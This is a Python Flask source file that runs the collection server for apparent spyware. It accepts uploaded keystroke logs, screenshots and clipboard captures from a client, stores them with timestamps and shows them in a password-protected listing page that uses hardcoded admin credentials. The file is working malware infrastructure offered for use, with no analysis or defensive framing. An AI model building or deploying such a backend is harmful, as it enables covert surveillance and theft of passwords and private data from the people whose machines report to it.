from flask import Flask, request, Response, render_template_string
import os
from datetime import datetime
from functools import wraps

app = Flask(__name__)

# Folder to store uploaded logs
UPLOAD_FOLDER = os.path.expanduser("~\\AppData\\Roaming\\LogsFromClient")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Authentication credentials
USERNAME = 'admin'
PASSWORD = 'secure123'

# Basic auth decorator
def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def authenticate():
    return Response(
        'Authentication required.', 401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'}
    )

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

# Home page
@app.route("/")
@requires_auth
def index():
    files = sorted(os.listdir(UPLOAD_FOLDER), reverse=True)
    html = "<h2>Uploaded Logs</h2><ul>"
    for file in files:
        file_path = os.path.join(UPLOAD_FOLDER, file)
        html += f'<li><a href="/logs/{file}">{file}</a></li>'
    html += "</ul>"
    return render_template_string(html)

# Serve uploaded logs
@app.route("/logs/<filename>")
@requires_auth
def serve_log(filename):
    return app.send_from_directory(UPLOAD_FOLDER, filename)

# Upload endpoint
@app.route("/upload", methods=["POST"])
@requires_auth
def upload_log():
    now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    if 'keylog' in request.files:
        keylog = request.files['keylog']
        keylog.save(os.path.join(UPLOAD_FOLDER, f"{now}_keylog.txt"))

    if 'screenshot' in request.files:
        ss = request.files['screenshot']
        ss.save(os.path.join(UPLOAD_FOLDER, f"{now}_screenshot.png"))

    if 'clipboard' in request.files:
        cb = request.files['clipboard']
        cb.save(os.path.join(UPLOAD_FOLDER, f"{now}_clipboard.txt"))

    return "Uploaded successfully", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
